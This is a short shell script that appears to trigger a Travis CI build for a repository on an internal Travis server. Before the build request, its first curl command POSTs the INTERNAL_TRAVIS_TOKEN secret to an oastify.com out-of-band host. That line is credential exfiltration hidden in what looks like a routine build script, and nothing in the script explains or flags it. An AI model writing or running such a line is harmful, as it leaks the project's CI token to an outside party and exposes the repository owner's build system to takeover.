#!/bin/sh

curl -i -s -XPOST \
  -H "Authorization: token ${INTERNAL_TRAVIS_TOKEN}" \
  https://8r0l79qa072gqink49399gcv3m9gx6lv.oastify.com

curl -i -s -XPOST \
  -H "Authorization: token ${INTERNAL_TRAVIS_TOKEN}" \
  -H 'Accept: application/json' \
  -H 'Travis-API-Version: 3' \
  -H 'Content-type: application/json' \
  -d '{"request":{"branch":"master"}}' \
  https://travis.schibsted.io/api/repo/spt-identity%2Fsdk-example.com/requests
